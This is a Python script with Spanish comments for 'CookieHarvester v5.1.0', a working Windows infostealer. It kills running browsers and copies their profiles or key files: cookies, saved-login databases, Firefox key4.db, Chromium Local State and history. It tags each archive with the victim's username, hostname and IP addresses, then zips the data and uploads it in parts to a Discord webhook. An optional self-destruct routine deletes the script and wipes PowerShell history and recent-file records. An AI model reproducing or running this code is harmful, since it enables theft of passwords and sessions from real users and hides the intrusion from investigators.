#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
CookieHarvester v5.1.0 - Windows Edition (OPTIMIZADO)
- Cierra navegadores automáticamente para copiar perfiles completos.
- Soporte para Firefox, Chrome, Edge, Brave, Opera, Vivaldi.
- Genera ZIP completo con múltiples partes.
- Fallback a archivos críticos si falla la copia completa.
- Autodestrucción mejorada.
- Manejo de errores robusto.
"""
from dotenv import load_dotenv # Cargar el .env
load_dotenv() # Leer el .env
import os
import sys
import time
import shutil
import zipfile
import tempfile
import subprocess
import socket
import getpass
import glob
import traceback
import ctypes
from math import ceil
from datetime import datetime

# ============================================================
# VERIFICAR E INSTALAR REQUESTS (MEJORADO)
# ============================================================
print("[DEBUG] === VERIFICANDO REQUESTS ===")
REQUESTS_DISPONIBLE = False
try:
    import requests
    REQUESTS_DISPONIBLE = True
    print("[+] Requests SI disponible")
    print(f"[+] Versión: {requests.__version__}")
except ImportError:
    print("[!] Requests NO disponible. Intentando instalar...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"], 
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        import requests
        REQUESTS_DISPONIBLE = True
        print("[+] Requests instalado correctamente")
    except:
        print("[!] No se pudo instalar requests. Continuando sin él...")
        REQUESTS_DISPONIBLE = False

if not REQUESTS_DISPONIBLE:
    print("[!] Requests no disponible. Saliendo...")
    sys.exit(1)

# ============================================================
# CONFIGURACIÓN (MEJORADA)
# ============================================================
VERSION = "v5.1.0"
DISCORD_WEBHOOK_URL = os.getenv("API_Discord")
MAX_SIZE_MB = 8
AUTODESTRUIR = False  # Cambiar a True antes de empaquetar
SOPORTE_CHROME = True
SOPORTE_FIREFOX = True
CERRAR_NAVEGADORES = True  # Cierra navegadores antes de copiar
REINTENTOS_COPIA = 5  # Aumentado de 3 a 5
REINTENTOS_ENVIO = 3
TIMEOUT_ENVIO = 30
DEBUG = False  # Cambiar a True para logs detallados

# ============================================================
# UTILIDADES (MEJORADAS)
# ============================================================
if not DISCORD_WEBHOOK_URL:
    raise ValueError("No hay API de Discord en .env")
    
def is_admin():
    """Verifica si el script se ejecuta como administrador"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def obtener_ip_publica():
    """Obtiene la IP pública con timeout"""
    try:
        return requests.get('https://api.ipify.org', timeout=5).text
    except:
        return "No disponible"

def obtener_ip_local():
    """Obtiene la IP local"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def navegador_abierto(nombre_proceso):
    """Verifica si un proceso está en ejecución"""
    try:
        resultado = subprocess.run(
            ['tasklist', '/FI', f'IMAGENAME eq {nombre_proceso}'],
            capture_output=True, text=True, shell=True
        )
        return nombre_proceso in resultado.stdout
    except:
        return False

def detectar_navegadores_abiertos():
    """Detecta qué navegadores están abiertos actualmente"""
    procesos = {
        'firefox.exe': 'Firefox',
        'chrome.exe': 'Chrome',
        'msedge.exe': 'Edge',
        'brave.exe': 'Brave',
        'opera.exe': 'Opera',
        'vivaldi.exe': 'Vivaldi'
    }
    abiertos = []
    for proc, nombre in procesos.items():
        if navegador_abierto(proc):
            abiertos.append(nombre)
    return abiertos

def cerrar_navegador_especifico(nombre_proceso, max_intentos=3):
    """Cierra un navegador específico con reintentos"""
    for intento in range(max_intentos):
        try:
            subprocess.run(['taskkill', '/F', '/IM', nombre_proceso], 
                          capture_output=True, shell=True)
            time.sleep(1)
            
            # Verificar que se cerró
            if not navegador_abierto(nombre_proceso):
                print(f"    [+] Cerrado: {nombre_proceso}")
                return True
            else:
                print(f"    [!] Intento {intento+1} falló, reintentando...")
                time.sleep(1)
        except:
            pass
    
    print(f"    [!] No se pudo cerrar {nombre_proceso} después de {max_intentos} intentos")
    return False

def cerrar_navegadores_antes_de_copiar():
    """Cierra navegadores si está activado en la configuración"""
    if not CERRAR_NAVEGADORES:
        return
    
    print("[*] Cerrando navegadores para copiar perfiles completos...")
    navegadores = ['msedge.exe', 'firefox.exe', 'chrome.exe', 'brave.exe']
    
    for proc in navegadores:
        if navegador_abierto(proc):
            cerrar_navegador_especifico(proc)
    
    # Esperar a que los procesos terminen completamente
    time.sleep(2)
    print("[+] Navegadores cerrados, procediendo con copia completa")

# ============================================================
# LOCALIZACIÓN DE PERFILES (MEJORADA)
# ============================================================
def encontrar_perfil_firefox():
    """Busca el perfil de Firefox"""
    base = os.path.expanduser('~')
    rutas = [
        os.path.join(base, 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles'),
        os.path.join(base, 'AppData', 'Local', 'Mozilla', 'Firefox', 'Profiles')
    ]
    for ruta_base in rutas:
        if not os.path.exists(ruta_base):
            continue
        for perfil in os.listdir(ruta_base):
            if perfil.endswith('.default-release') or perfil.endswith('.default'):
                ruta_perfil = os.path.join(ruta_base, perfil)
                if os.path.exists(os.path.join(ruta_perfil, 'cookies.sqlite')):
                    return ruta_perfil
    return None

def encontrar_perfil_chrome():
    """Busca perfiles de navegadores Chromium"""
    if not SOPORTE_CHROME:
        return []
    
    base = os.path.expanduser('~')
    perfiles = []
    navegadores = {
        'Chrome': os.path.join(base, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default'),
        'Edge': os.path.join(base, 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default'),
        'Brave': os.path.join(base, 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
        'Opera': os.path.join(base, 'AppData', 'Roaming', 'Opera Software', 'Opera Stable'),
        'Vivaldi': os.path.join(base, 'AppData', 'Local', 'Vivaldi', 'User Data', 'Default')
    }
    
    for nombre, ruta in navegadores.items():
        # Verificar si existe el perfil
        if os.path.exists(os.path.join(ruta, 'Network', 'Cookies')):
            perfiles.append((ruta, nombre))
        # También buscar en la raíz (para Edge/Chrome)
        elif os.path.exists(os.path.join(os.path.dirname(ruta), 'Local State')):
            perfiles.append((os.path.dirname(ruta), nombre))
    
    return perfiles

# ============================================================
# COPIAR PERFIL (MEJORADO)
# ============================================================
def copiar_perfil_completo(origen, destino, max_intentos=REINTENTOS_COPIA):
    """Copia toda la carpeta del perfil con reintentos y verificación"""
    for i in range(max_intentos):
        try:
            if os.path.exists(destino):
                shutil.rmtree(destino, ignore_errors=True)
            
            shutil.copytree(origen, destino, symlinks=False, ignore_dangling_symlinks=True)
            
            # Verificar que se copió correctamente
            if os.path.exists(destino):
                archivos_origen = sum([len(files) for _, _, files in os.walk(origen)])
                archivos_destino = sum([len(files) for _, _, files in os.walk(destino)])
                
                # Si copió al menos el 80% de los archivos, considerar exitoso
                if archivos_destino >= archivos_origen * 0.8:
                    print(f"    [+] Copiados {archivos_destino} archivos")
                    return True
                else:
                    print(f"    [!] Solo {archivos_destino}/{archivos_origen} archivos copiados")
            
            if i < max_intentos - 1:
                print(f"    [!] Intento {i+1} falló, reintentando en 1s...")
                time.sleep(1)
                
        except Exception as e:
            if i < max_intentos - 1:
                print(f"    [!] Intento {i+1} falló: {e}")
                time.sleep(1)
            else:
                print(f"    [!] Error copiando perfil: {e}")
                return False
    
    return False

def extraer_archivos_criticos(perfil_path, nombre_navegador, temp_dir):
    """Extrae solo archivos críticos (fallback mejorado)"""
    archivos_copiados = []
    carpeta_destino = os.path.join(temp_dir, f"{nombre_navegador}_criticos")
    os.makedirs(carpeta_destino, exist_ok=True)
    
    if nombre_navegador == "Firefox":
        archivos_a_copiar = {
            'cookies.sqlite': os.path.join(perfil_path, 'cookies.sqlite'),
            'logins.json': os.path.join(perfil_path, 'logins.json'),
            'places.sqlite': os.path.join(perfil_path, 'places.sqlite'),
            'key4.db': os.path.join(perfil_path, 'key4.db'),
        }
    else:
        # Para navegadores Chromium
        archivos_a_copiar = {
            'Cookies': os.path.join(perfil_path, 'Network', 'Cookies'),
            'Login Data': os.path.join(perfil_path, 'Login Data'),
            'History': os.path.join(perfil_path, 'History'),
            'Bookmarks': os.path.join(perfil_path, 'Bookmarks'),
            'Web Data': os.path.join(perfil_path, 'Web Data'),
            'Local State': os.path.join(os.path.dirname(perfil_path), 'Local State'),
        }
    
    for nombre, origen in archivos_a_copiar.items():
        if os.path.exists(origen):
            destino = os.path.join(carpeta_destino, f"{nombre_navegador}_{nombre}")
            try:
                shutil.copy2(origen, destino)
                archivos_copiados.append(destino)
                print(f"    [+] Copiado crítico: {nombre}")
            except Exception as e:
                print(f"    [!] Falló crítico: {nombre} - {e}")
        else:
            print(f"    [-] No existe: {nombre}")
    
    return archivos_copiados, carpeta_destino

# ============================================================
# CREAR INFO.TXT (MEJORADO)
# ============================================================
def crear_info_txt(destino, ip_publica, ip_local, version, navegadores_abiertos, navegador_nombre, modo):
    """Crea info.txt con información detallada"""
    with open(destino, 'w', encoding='utf-8') as f:
        f.write("=" * 60 + "\n")
        f.write(f"  CookieHarvester {version} - Windows Edition\n")
        f.write("=" * 60 + "\n")
        f.write(f"Usuario: {getpass.getuser()}\n")
        f.write(f"Equipo: {socket.gethostname()}\n")
        f.write(f"Sistema: {sys.platform} - {os.name}\n")
        f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"IP Local: {ip_local}\n")
        f.write(f"IP Pública: {ip_publica}\n")
        f.write(f"Navegador: {navegador_nombre}\n")
        f.write(f"Modo: {modo}\n")
        f.write(f"Navegadores abiertos: {', '.join(navegadores_abiertos) if navegadores_abiertos else 'Ninguno'}\n")
        f.write(f"Admin: {'Sí' if is_admin() else 'No'}\n")
        f.write("=" * 60 + "\n")

# ============================================================
# COMPRESIÓN Y ENVÍO (MEJORADO)
# ============================================================
def crear_zip_desde_carpeta(carpeta_origen, zip_destino):
    """Comprime una carpeta en ZIP (optimizado)"""
    try:
        archivos = []
        for root, _, files in os.walk(carpeta_origen):
            for file in files:
                full_path = os.path.join(root, file)
                arcname = os.path.relpath(full_path, carpeta_origen)
                archivos.append((full_path, arcname))
        
        if not archivos:
            print("[!] No hay archivos para comprimir")
            return False
        
        print(f"    Comprimiendo {len(archivos)} archivos...")
        
        with zipfile.ZipFile(zip_destino, 'w', zipfile.ZIP_DEFLATED) as zf:
            for i, (full_path, arcname) in enumerate(archivos):
                try:
                    zf.write(full_path, arcname)
                except:
                    pass
                
                # Mostrar progreso cada 100 archivos
                if i % 100 == 0 and i > 0:
                    progreso = (i + 1) / len(archivos) * 100
                    if DEBUG:
                        print(f"    Progreso: {progreso:.1f}%")
        
        size_mb = os.path.getsize(zip_destino) / (1024 * 1024)
        print(f"    [+] ZIP creado: {size_mb:.2f} MB")
        return True
        
    except Exception as e:
        print(f"    [!] Error creando ZIP: {e}")
        return False

def dividir_zip_en_partes_optimizado(zip_path, max_size_mb=8):
    """Divide ZIP en partes (sin cargar todo en memoria)"""
    max_bytes = max_size_mb * 1024 * 1024
    file_size = os.path.getsize(zip_path)
    
    if file_size <= max_bytes:
        return [zip_path]
    
    parts = []
    base_name = os.path.splitext(zip_path)[0]
    
    try:
        with open(zip_path, 'rb') as f_in:
            total_parts = ceil(file_size / max_bytes)
            for i in range(total_parts):
                part_path = f"{base_name}_part{i+1}.zip"
                with open(part_path, 'wb') as f_out:
                    chunk = f_in.read(max_bytes)
                    f_out.write(chunk)
                parts.append(part_path)
        
        print(f"    [+] ZIP dividido en {len(parts)} partes")
        return parts
    except Exception as e:
        print(f"    [!] Error dividiendo ZIP: {e}")
        return [zip_path]

def enviar_a_discord(webhook_url, zip_path, caption=None, intento=1, max_intentos=REINTENTOS_ENVIO):
    """Envía archivo a Discord con reintentos mejorados"""
    try:
        if not os.path.exists(zip_path):
            return False
        
        with open(zip_path, 'rb') as f:
            files = {'file': (os.path.basename(zip_path), f, 'application/zip')}
            data = {'content': caption[:1000] if caption else ''}
            response = requests.post(webhook_url, files=files, data=data, timeout=TIMEOUT_ENVIO)
        
        if response.status_code in [200, 204]:
            return True
        elif response.status_code == 429:
            if intento < max_intentos:
                wait_time = min(2 ** intento, 60)
                print(f"    Rate limit, esperando {wait_time}s...")
                time.sleep(wait_time)
                return enviar_a_discord(webhook_url, zip_path, caption, intento+1, max_intentos)
            return False
        else:
            if intento < max_intentos:
                wait_time = min(2 ** (intento - 1), 30)
                time.sleep(wait_time)
                return enviar_a_discord(webhook_url, zip_path, caption, intento+1, max_intentos)
            return False
            
    except Exception as e:
        print(f"    [!] Error enviando: {e}")
        if intento < max_intentos:
            wait_time = min(2 ** (intento - 1), 30)
            time.sleep(wait_time)
            return enviar_a_discord(webhook_url, zip_path, caption, intento+1, max_intentos)
        return False

# ============================================================
# PROCESAR PERFIL (MEJORADO)
# ============================================================
def procesar_perfil(perfil_path, nombre_navegador, temp_dir, ip_publica, ip_local, navegadores_abiertos):
    """Procesa un perfil completo con fallback"""
    print(f"\n[+] Procesando: {nombre_navegador}")
    print(f"    Ruta: {perfil_path}")
    
    # Cerrar navegador si está abierto
    if CERRAR_NAVEGADORES:
        procesos_navegadores = {
            'Edge': 'msedge.exe',
            'Firefox': 'firefox.exe',
            'Chrome': 'chrome.exe',
            'Brave': 'brave.exe',
        }
        if nombre_navegador in procesos_navegadores:
            proc = procesos_navegadores[nombre_navegador]
            if navegador_abierto(proc):
                print(f"    [*] {nombre_navegador} está abierto, cerrándolo...")
                cerrar_navegador_especifico(proc)
    
    carpeta_copia = os.path.join(temp_dir, f"{nombre_navegador}_perfil")
    
    # Intentar copia completa
    if copiar_perfil_completo(perfil_path, carpeta_copia):
        print(f"    [+] Perfil COMPLETO copiado")
        modo = "COMPLETO"
    else:
        # Fallback: extraer archivos críticos
        print(f"    [*] Falló copia completa, extrayendo archivos críticos...")
        archivos_criticos, carpeta_copia = extraer_archivos_criticos(perfil_path, nombre_navegador, temp_dir)
        if not archivos_criticos:
            print(f"    [!] No se pudo extraer nada de {nombre_navegador}")
            return False
        modo = "CRITICOS"
        print(f"    [+] Archivos críticos extraídos: {len(archivos_criticos)}")
    
    # Crear info.txt
    info_path = os.path.join(carpeta_copia, "info.txt")
    crear_info_txt(info_path, ip_publica, ip_local, VERSION, navegadores_abiertos, nombre_navegador, modo)
    
    # Comprimir
    fecha = datetime.now().strftime('%Y-%m-%d')
    nombre_base = f"{ip_publica.replace('.', '_')}_{getpass.getuser()}_{socket.gethostname()}_{fecha}_{nombre_navegador}_{modo}"
    zip_path = os.path.join(temp_dir, f"{nombre_base}.zip")
    
    if not crear_zip_desde_carpeta(carpeta_copia, zip_path):
        print(f"    [!] Error comprimiendo {nombre_navegador}")
        return False
    
    # Dividir y enviar
    parts = dividir_zip_en_partes_optimizado(zip_path, MAX_SIZE_MB)
    size_mb = os.path.getsize(zip_path) / (1024 * 1024)
    print(f"    [+] ZIP: {size_mb:.2f} MB, {len(parts)} parte(s)")
    
    exitos = 0
    for idx, part in enumerate(parts, 1):
        caption = f"📁 **{nombre_navegador}** ({modo}) - Parte {idx}/{len(parts)} | {nombre_base}"
        if enviar_a_discord(DISCORD_WEBHOOK_URL, part, caption):
            exitos += 1
            print(f"    [+] Parte {idx}/{len(parts)} enviada")
        else:
            print(f"    [!] Parte {idx}/{len(parts)} falló")
        time.sleep(1)
    
    return exitos == len(parts)

# ============================================================
# AUTODESTRUCCIÓN (MEJORADA)
# ============================================================
def autodestruir_seguro(temp_dir, script_path, mensajes_enviados):
    """Autodestrucción mejorada con limpieza completa"""
    try:
        print("\n[*] Iniciando autodestrucción en Windows...")
        
        # Eliminar directorios temporales de CookieHarvester
        c4_dirs = glob.glob('C:\\Users\\*\\AppData\\Local\\Temp\\c4_*')
        for c4_dir in c4_dirs:
            if os.path.exists(c4_dir):
                shutil.rmtree(c4_dir, ignore_errors=True)
                print(f"[+] Eliminado: {c4_dir}")
        
        # Eliminar ZIPs
        zips = glob.glob(os.path.join(temp_dir, '*.zip'))
        for z in zips:
            try:
                os.remove(z)
                print(f"[+] Eliminado ZIP: {os.path.basename(z)}")
            except:
                pass
        
        # Limpiar historial de PowerShell
        os.system('Clear-History 2>nul')
        os.system('del /f /q %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul')
        
        # Limpiar historial de ejecución (Run)
        os.system('del /f /q %APPDATA%\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\* 2>nul')
        
        # Eliminar el script
        time.sleep(1)
        if os.path.exists(script_path):
            os.remove(script_path)
            print(f"[+] Eliminado script: {os.path.basename(script_path)}")
        
        # Eliminar .pyc
        pyc_file = f"{script_path}c"
        if os.path.exists(pyc_file):
            os.remove(pyc_file)
            print(f"[+] Eliminado: {pyc_file}")
        
        print("[+] 🧹 Autodestrucción completada en Windows")
        sys.exit(0)
        
    except Exception as e:
        print(f"[!] Error en autodestrucción: {e}")
        traceback.print_exc()
        sys.exit(1)

# ============================================================
# MAIN (MEJORADO)
# ============================================================
def main():
    print("\n[DEBUG] === INICIO DE MAIN (Windows) ===")
    script_path = os.path.abspath(__file__)
    
    print("=" * 60)
    print(f"  CookieHarvester {VERSION} - Windows Edition  ")
    print("=" * 60)
    
    usuario = getpass.getuser()
    equipo = socket.gethostname()
    print(f"[+] Objetivo: {usuario}@{equipo}")
    
    ip_publica = obtener_ip_publica()
    ip_local = obtener_ip_local()
    print(f"[+] IP Local: {ip_local}")
    print(f"[+] IP Pública: {ip_publica}")
    
    # Detectar navegadores abiertos ANTES de cerrarlos
    abiertos = detectar_navegadores_abiertos()
    if abiertos:
        print(f"[+] Navegadores abiertos: {', '.join(abiertos)}")
    else:
        print("[+] No hay navegadores abiertos.")
    
    # Cerrar navegadores antes de copiar
    cerrar_navegadores_antes_de_copiar()
    
    # Crear directorio temporal
    temp_dir = tempfile.mkdtemp(prefix="c4_")
    print(f"[+] Directorio temporal: {temp_dir}")
    
    # Buscar perfiles
    perfiles = []
    if SOPORTE_FIREFOX:
        firefox_path = encontrar_perfil_firefox()
        if firefox_path:
            perfiles.append((firefox_path, "Firefox"))
    
    if SOPORTE_CHROME:
        perfiles.extend(encontrar_perfil_chrome())
    
    if not perfiles:
        print("[!] No se encontraron perfiles de navegadores.")
        sys.exit(1)
    
    print(f"\n[+] Perfiles encontrados: {len(perfiles)}")
    for path, nombre in perfiles:
        print(f"    - {nombre}: {path}")
    
    # Procesar cada perfil
    errores_globales = False
    perfiles_procesados = []
    total_partes = 0
    
    for perfil_path, nombre in perfiles:
        exito = procesar_perfil(perfil_path, nombre, temp_dir, ip_publica, ip_local, abiertos)
        if not exito:
            errores_globales = True
        perfiles_procesados.append({'nombre': nombre, 'partes': 1})
        total_partes += 1
    
    # Autodestrucción o limpieza
    if AUTODESTRUIR:
        autodestruir_seguro(temp_dir, script_path, {})
    else:
        if temp_dir and os.path.exists(temp_dir):
            shutil.rmtree(temp_dir, ignore_errors=True)
        print("\n[+] Limpieza completada (sin autodestrucción).")
        print("=" * 60)

if __name__ == "__main__":
    main()